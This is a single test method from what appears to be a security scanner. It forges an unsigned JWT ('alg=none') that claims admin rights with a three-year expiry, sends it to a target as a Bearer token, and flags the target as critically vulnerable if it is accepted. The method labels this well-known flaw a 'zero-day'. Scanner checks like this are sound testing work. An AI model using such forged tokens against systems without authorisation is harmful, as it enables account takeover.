    def test_zeroday_jwt_expiry_bypass(self):
        """Zero-day #81 — JWT Expiry Bypass (clk skew)."""
        if not self.deep: return
        self._print("[*]", "Zero-day: JWT Expiry Bypass...", "INFO")
        import base64, json as _json, time
        # Forge JWT with very long expiry
        evil_payload = {
            "sub": "admin",
            "admin": True,
            "iat": int(time.time()),
            "exp": int(time.time()) + 94608000,  # 3 years
            "aud": "test",
            "iss": "test"
        }
        payload_b64 = base64.urlsafe_b64encode(
            _json.dumps(evil_payload).encode()).decode().rstrip("=")
        # Try alg=none
        header = base64.urlsafe_b64encode(
            _json.dumps({"alg": "none"}).encode()).decode().rstrip("=")
        evil_jwt = f"{header}.{payload_b64}."
        r = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
        if r and r.status_code == 200:
            self._add_vuln("Zero-day JWT Expiry Bypass (alg=none)",
                            "CRITICAL", self.target,
                            "Server accepted alg=none JWT with long expiry")

